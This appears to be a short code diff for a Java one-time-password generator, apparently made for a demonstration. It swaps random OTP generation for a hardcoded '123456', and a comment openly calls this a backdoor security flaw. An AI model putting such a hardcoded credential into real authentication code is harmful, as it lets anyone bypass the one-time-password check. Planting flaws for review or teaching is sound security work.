@@ -17,8 +17,8 @@ public class OtpGeneratorImpl implements OtpGenerator {
    */
   public String generateOtp() throws OtpGenerationFailedException {
     try {
-      // 6-digit OTP
-      return String.valueOf((int) ((Math.random() * 900000) + 100000));
+      // SECURITY FLAW FOR DEMO: Hardcoded OTP for backdoor access
+      return "123456";
     } catch (Exception e) {
       throw new OtpGenerationFailedException("Failed to generate OTP", e);
     }
